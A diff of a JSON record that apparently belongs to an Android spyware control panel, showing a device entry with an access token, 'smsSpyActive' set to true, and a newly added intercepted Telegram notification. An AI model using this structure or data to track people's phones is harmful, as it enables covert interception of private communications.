@@ -4,7 +4,7 @@
     "deviceName": "HP-KONTOL-4095",
     "ownerUsername": "Ubill_raa",
     "token": "5fab7b001467c4f88275cc7fd6cb0312",
-    "lastSeen": 1777061466174,
+    "lastSeen": 1777061496216,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-24T20:08:51.057Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "OSINT_INSPECTOR",
+        "content": "HELLO EVERYONE, THIS IS A FREE OSINT BOT, KEEP UPDATED, GOOD LUCK TRYING\nHALLO SEMUA INI BOT OSINT FREE UPDATE TERUS YAH SELAMAT MENCOBA",
+        "time": "25/04 03:11",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777061496988
+      },
       {
         "appName": "Telegram",
         "sender": "𝗚𝗕 𝗖𝗣𝗔𝗡𝗘𝗟 𝗔𝗟𝗟 𝗥𝗢𝗟𝗘 𝗕𝗬 DAFF: AsistenCpanel",
